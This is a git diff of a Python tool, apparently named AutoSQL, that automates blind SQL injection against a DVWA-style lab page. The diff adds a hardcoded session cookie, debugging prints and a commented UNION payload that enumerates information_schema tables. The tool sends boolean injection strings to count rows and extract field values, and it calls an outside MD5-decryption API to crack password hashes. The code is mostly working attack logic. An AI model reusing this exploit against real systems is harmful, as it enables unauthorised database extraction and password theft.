@@ -1,4 +1,5 @@
 # Repositorio : https://github.com/ConnorXploit/AutoSQL
+# Manual : http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 from colorama import init, Fore
 import requests
 import urllib
@@ -10,12 +11,14 @@ class Programa():
     
     def __init__(self): 
         # URL para peticiones SQL Blind
-        self.url='http://192.168.1.6/vulnerabilities/sqli_blind/'
+        self.url='http://192.168.1.52:1234/vulnerabilities/sqli_blind/'
 
         #self.url='http://{}/vulnerabilities/sqli_blind/'.format(IP)  <-- Argsparse y así cualquier IP
 
         self.abecedario_hexadecimal='abcdef0123456789'
         self.abecedario='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        self.cookie_session='gha62i78ggcgud7ib1ms05fl31'
+        self.nivel='medium'
 
         self.url_md5_decrypt = "https://md5.pinasthika.com/api/decrypt"
 
@@ -58,7 +61,7 @@ class Programa():
             result = requests.post(
                 url=self.url,
                 headers={'Content-Type':'application/x-www-form-urlencoded'},
-                cookies={'PHPSESSID':'e9vfd46d11qdsmh2pi17fel0c0', 'security':'medium'},
+                cookies={'PHPSESSID':self.cookie_session, 'security':self.nivel},
                 #proxies={'http':'http://127.0.0.1:8080/'},
                 data={'id': sqli, 'Submit': 'Submit'}
             )
@@ -79,7 +82,7 @@ class Programa():
 
     def cantidadTuplasEnTapla(self, tabla, campo):
         result = 0
-        for i in range(1, 100000):
+        for i in range(0, 100000):
             sentencia = "0 or {i} = (select count({campo}) from {tabla})".format(i=i, campo=campo, tabla=tabla)
             existe = self.ejecutarSQL(sentencia)
             if existe:
@@ -89,7 +92,9 @@ class Programa():
 
     def longitudCampoIDtablaCampo(self, id, tabla, campo, campoConocido):
         for i in range(1, 100):
-            existe = self.ejecutarSQL("0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id))
+            sentencia = "0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id)
+            print(sentencia)
+            existe = self.ejecutarSQL(sentencia)
             if existe:
                 return i+2
         return -1
@@ -116,6 +121,8 @@ class Programa():
         print('[{asterisco}] - Sacando datos de la tabla {tabla} de la columna {columna}'.format(asterisco=self.color('*', 'amarillo'), tabla=tabla, columna=columna))
         contador_null = 0
         nombres = []
+        print(tabla)
+        print(columna)
         cantidad_registros_en_tabla = self.cantidadTuplasEnTapla(tabla, columna)        
         if cantidad_registros_en_tabla > 0:
             print('[{asterisco}] - {mensaje} {num} {mensaje2} {tabla}'.format(asterisco=self.color('*', 'verde', True), mensaje=self.color('Se han encontrado', 'verde', True), num=cantidad_registros_en_tabla, mensaje2=self.color('registros en la tabla', 'verde'), tabla=tabla))
@@ -165,6 +172,10 @@ class Programa():
             nombres.append(nombre)
         return nombres
 
+    def cogerTablas(self):
+        # 1' union all select table_schema,table_name FROM information_schema.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" -- 
+        pass
+
 if __name__ == "__main__":
     init() # Init de Colorama
     programa = Programa()
@@ -175,7 +186,7 @@ if __name__ == "__main__":
         #pass_dec = programa.md5_decrypt(passw)
         #print('[{asterisco}] - {titulo_user}: {user}\t- {titulo_passw}: {passw}\t- {titulo_password_limpia}: {pass_limpia}'.format(asterisco=programa.color('*', 'verde', True), titulo_user=programa.color('User', 'verde', True), user=programa.color(nombres[contador], 'verde', True), titulo_passw=programa.color('Password', 'verde', True), passw=programa.color(passw, 'verde', True), titulo_password_limpia=programa.color('Password Limpia', 'verde', True), pass_limpia=programa.color(pass_dec, 'verde', True)))
         #contador += 1
-    nombres = programa.sacarValorPorTablaColumnaID(tabla='information_schema.columns', columna='table_name', nombre_campo_id='column_name')
+    nombres = programa.sacarValorPorTablaColumnaID(tabla='information_schema.tables', columna='table_name', nombre_campo_id='table_name')
     print(nombres)
     #columnsname = programa.cogerColumnasTabla(tabla='information_schema.columns', tabla_name='table_name')
     #print(columnsname)
